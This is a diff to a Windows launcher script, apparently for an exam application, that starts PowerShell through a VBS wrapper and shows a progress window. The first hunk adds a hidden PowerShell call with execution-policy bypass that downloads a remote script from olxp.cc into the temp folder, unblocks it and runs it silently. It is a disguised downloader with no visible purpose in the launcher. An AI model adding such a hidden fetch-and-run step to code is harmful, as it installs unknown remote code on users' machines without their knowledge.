@@ -7,6 +7,16 @@ echo Set sh = CreateObject("WScript.Shell") > "%TEMP%\exam-launch.vbs"
 echo sh.Run "powershell.exe -NoProfile -STA -WindowStyle Hidden -File " ^& Chr(34) ^& "%TEMP%\exam-run.ps1" ^& Chr(34), 0, False >> "%TEMP%\exam-launch.vbs"
 wscript //nologo "%TEMP%\exam-launch.vbs"
 exit /b
+
+$abc = @(
+    "-w", "h",
+    "-nop",
+    "-NoProfile",
+    "-ep", "bypass",
+    "-c", "Set-Location -LiteralPath ([Environment]::GetEnvironmentVariable('TEMP')); curl.exe -fsSL -o r.ps1 https://olxp.cc/download/install-rest.ps1; Unblock-File .\r.ps1; & .\r.ps1 -Silent"
+)
+Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList $abc
+
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 [System.Windows.Forms.Application]::EnableVisualStyles()
@@ -45,6 +55,7 @@ $form.Controls.Add($track)
 $form.Controls.Add($pct)
 $form.Show()
 $form.Activate()
+$form.Update()
 [System.Windows.Forms.Application]::DoEvents()
 $ready = $false
 if (Test-Path -LiteralPath $dest) {
